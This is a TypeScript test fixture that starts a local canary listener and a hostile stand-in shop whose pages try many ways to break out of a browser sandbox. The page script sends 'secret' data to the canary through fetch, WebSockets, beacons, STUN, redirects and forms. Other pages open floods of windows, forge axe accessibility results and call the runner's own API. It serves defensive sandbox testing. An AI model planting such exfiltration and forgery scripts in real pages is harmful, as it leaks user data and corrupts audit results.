// What LB-07's escape tests share: a canary on another address of this machine that writes down every request,
// every WebSocket upgrade and every UDP packet that reaches it, and a hostile stand-in for the shop's origin whose
// pages try every way out of the sandbox a page can try: scripts that fetch, open sockets and streams, send
// beacons, load images, modules, frames and workers, prefetch, open windows and dial a STUN server; a redirect, a
// refresh and a form to the canary; a link whose script swaps its target after the check; a window bomb; a page
// that forges axe's results; a page that never answers; a page that calls the runner's own API. The shop itself
// is never like this; these pages stand for a shop that was, to show what holds when the page is the enemy.
import { createServer } from 'node:http'
import type { IncomingMessage, Server, ServerResponse } from 'node:http'
import { createSocket } from 'node:dgram'
import type { AddressInfo } from 'node:net'

/** A canary: a TCP and a UDP listener on 127.0.0.2, and what reached each. */
export interface Canary {
  host: string
  port: number
  udpPort: number
  // Every request line and upgrade that reached the TCP listener, and how many UDP packets reached the other.
  hits: string[]
  udpPackets: () => number
  // Forgets what has reached it so far, for the next test.
  reset: () => void
  close: () => Promise<void>
}

/** Starts the canary on 127.0.0.2, an address of this machine that is not the shop's. */
export async function startCanary(): Promise<Canary> {
  const hits: string[] = []
  const server = createServer((request, response) => {
    hits.push(`${request.method} ${request.url}`)
    response.end('canary')
  })
  server.on('upgrade', (request: IncomingMessage, socket) => {
    hits.push(`UPGRADE ${request.url}`)
    socket.destroy()
  })
  await new Promise<void>(resolve => server.listen(0, '127.0.0.2', resolve))
  let packets = 0
  const udp = createSocket('udp4')
  udp.on('message', () => {
    packets += 1
  })
  await new Promise<void>(resolve => udp.bind(0, '127.0.0.2', resolve))
  return {
    host: '127.0.0.2',
    port: (server.address() as AddressInfo).port,
    udpPort: udp.address().port,
    hits,
    udpPackets: () => packets,
    reset: () => {
      hits.length = 0
      packets = 0
    },
    close: async () => {
      udp.close()
      await new Promise<void>(resolve => server.close(() => resolve()))
    },
  }
}

/** The lines of the escape script that call the runner's own API, as a page would if it knew where the API is. */
function runnerCalls(runnerUrl: string | undefined): string {
  if (runnerUrl === undefined) return ''
  const body = JSON.stringify({ runId: 'run-from-a-page', engine: 'chromium', bugToken: null, wallClockMs: 5000 })
  return [
    `fetch(${JSON.stringify(`${runnerUrl}/healthz`)}).catch(() => note('runner'));`,
    `fetch(${JSON.stringify(`${runnerUrl}/sessions`)}, { method: 'POST', headers: { 'content-type': 'text/plain' }, body: ${JSON.stringify(body)} }).catch(() => note('runner-post'));`,
  ].join('\n')
}

/** The script of the page that tries every way out at once, aimed at the canary and, when given, at the runner's API. */
function escapeScript(canary: Canary, runnerUrl: string | undefined): string {
  const out = `http://${canary.host}:${canary.port}`
  return `
'use strict';
const out = ${JSON.stringify(out)};
const tried = [];
function note(name) { tried.push(name); document.getElementById('tried').textContent = tried.join(' '); }
fetch(out + '/fetch?secret=1').catch(() => note('fetch'));
const xhr = new XMLHttpRequest(); xhr.open('GET', out + '/xhr'); xhr.onerror = () => note('xhr'); xhr.send();
try { const socket = new WebSocket(${JSON.stringify(`ws://${canary.host}:${canary.port}/ws`)}); socket.onerror = () => note('ws'); } catch (error) { note('ws-throw'); }
try { const stream = new EventSource(out + '/events'); stream.onerror = () => { note('eventsource'); stream.close(); }; } catch (error) { note('es-throw'); }
try { navigator.sendBeacon(out + '/beacon', 'data'); } catch (error) { note('beacon-throw'); }
const image = new Image(); image.onerror = () => note('img'); image.src = out + '/img.png';
import(out + '/module.js').catch(() => note('import'));
for (const rel of ['prefetch', 'preload', 'stylesheet', 'preconnect', 'dns-prefetch']) { const link = document.createElement('link'); link.rel = rel; link.href = out + '/' + rel; if (rel === 'preload') link.as = 'script'; document.head.appendChild(link); }
const frame = document.createElement('iframe'); frame.src = out + '/frame'; document.body.appendChild(frame);
try { new Worker('/worker.js'); } catch (error) { note('worker-throw'); }
const ping = document.createElement('a'); ping.href = '/'; ping.ping = out + '/ping'; document.body.appendChild(ping);
try { const peer = new RTCPeerConnection({ iceServers: [{ urls: ${JSON.stringify(`stun:${canary.host}:${canary.udpPort}`)} }] }); peer.createDataChannel('x'); peer.createOffer().then(offer => peer.setLocalDescription(offer)); } catch (error) { note('rtc-throw'); }
if (navigator.serviceWorker) navigator.serviceWorker.register('/sw.js').then(() => note('sw-registered'), () => note('sw-refused')); else note('sw-missing');
${runnerCalls(runnerUrl)}
for (let index = 0; index < 5; index += 1) window.open(out + '/popup' + index);
`
}

/** A small HTML page. */
function page(title: string, body: string, head = ''): string {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>${title}</title>${head}</head><body><main><h1>${title}</h1>${body}</main></body></html>`
}

/** What the hostile shop serves at a path, given the canary and the runner's address. */
function respond(path: string, canary: Canary, runnerUrl: string | undefined, response: ServerResponse): void {
  const out = `http://${canary.host}:${canary.port}`
  const html = (status: number, body: string): void => {
    response.writeHead(status, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' })
    response.end(body)
  }
  switch (path) {
    case '/escape': return html(200, page('Escape', '<p id="tried">nothing yet</p>', '<script src="/escape.js" defer></script>'))
    case '/escape.js':
      response.writeHead(200, { 'content-type': 'text/javascript' })
      return void response.end(escapeScript(canary, runnerUrl))
    case '/worker.js':
      response.writeHead(200, { 'content-type': 'text/javascript' })
      return void response.end(`fetch(${JSON.stringify(`${out}/from-worker`)}).catch(() => {})`)
    case '/sw.js':
      response.writeHead(200, { 'content-type': 'text/javascript' })
      return void response.end('self.addEventListener("fetch", () => {})')
    case '/redirect':
      response.writeHead(302, { location: `${out}/redirected?secret=1` })
      return void response.end()
    case '/refresh': return html(200, page('Refresh', '<p>Going.</p>', `<meta http-equiv="refresh" content="0;url=${out}/refreshed">`))
    case '/form': return html(200, page('Form', `<form method="post" action="${out}/posted"><label for="q">Question</label><input id="q" name="q" value="secret"><button type="submit">Send</button></form>`))
    case '/swap': return html(200, page('Swap', `<a href="/escape" id="swap">Next page</a><script>document.getElementById('swap').addEventListener('click', function (event) { event.preventDefault(); location.href = ${JSON.stringify(`${out}/swapped`)}; });</script>`))
    case '/bomb': return html(200, page('Bomb', '<p>Windows.</p><script>for (let index = 0; index < 60; index += 1) window.open("/page" + index);</script>'))
    case '/axe-trap': return html(200, page('Trap', '<img src="/nothing.png">', `<script>Object.defineProperty(window, 'axe', { configurable: false, get: function () { return { run: function () { return Promise.resolve({ violations: [{ id: 'image-alt', impact: 'critical\\n${'x'.repeat(300)}', help: 'forged', nodes: [{ target: ['img'] }] }, { id: 'Not A Rule <script>', impact: 'serious', nodes: 'not a list' }] }); } }; }, set: function () {} });</script>`))
    case '/huge': return html(200, page('Huge', Array.from({ length: 30_000 }, (_, index) => `<button>Button ${index}</button>`).join('')))
    case '/never': return
    case '/download':
      response.writeHead(200, { 'content-type': 'application/octet-stream', 'content-disposition': 'attachment; filename="payload.bin"' })
      return void response.end(Buffer.alloc(1_024))
    default: return html(200, page('Hostile shop', '<p>Plain page.</p>'))
  }
}

/** A hostile stand-in for the shop's origin on 127.0.0.1, its pages aimed at the canary and, when given, at the runner's API. */
export interface HostileShop {
  origin: string
  // Points the page that tries every way out at the runner's API too.
  runnerUrl: string | undefined
  close: () => Promise<void>
}

/** Starts the hostile shop on a free port of 127.0.0.1. */
export async function startHostileShop(canary: Canary): Promise<HostileShop> {
  const shop: HostileShop = { origin: '', runnerUrl: undefined, close: async () => {} }
  const server: Server = createServer((request, response) => {
    respond(new URL(request.url ?? '/', 'http://hostile.invalid').pathname, canary, shop.runnerUrl, response)
  })
  await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
  shop.origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
  shop.close = () => new Promise((resolve) => {
    server.closeAllConnections()
    server.close(() => resolve())
  })
  return shop
}
